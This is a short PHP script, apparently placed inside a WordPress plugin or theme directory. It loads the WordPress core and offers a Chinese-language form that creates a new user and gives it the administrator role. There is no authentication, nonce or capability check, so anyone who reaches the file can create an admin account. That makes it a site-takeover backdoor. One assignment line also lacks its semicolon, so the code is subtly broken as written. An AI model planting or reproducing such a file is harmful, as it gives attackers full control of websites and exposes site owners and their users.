<?php
require_once('../../../wp-load.php');
// 如果表单提交
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = sanitize_user($_POST['username']);
    $password = $_POST['password'];
    $email    = $username."@gmail.com"

    if ( username_exists($username) || email_exists($email) ) {
        $msg = "用户已存在";
    } else {
        $user_id = wp_create_user($username, $password, $email);
        if (is_wp_error($user_id)) {
            $msg = "创建失败: " . $user_id->get_error_message();
        } else {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            $msg = "管理员创建成功：{$username}";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>创建管理员</title>
</head>
<body>
    <h2>创建新管理员账号</h2>
    <?php if (!empty($msg)) echo "<p><strong>$msg</strong></p>"; ?>
    <form method="post">
        <p>
            用户名: <input type="text" name="username" required>
        </p>
        <p>
            密码: <input type="text" name="password" required>
        </p>
        <p>
            <button type="submit">创建管理员</button>
        </p>
    </form>
</body>
</html>
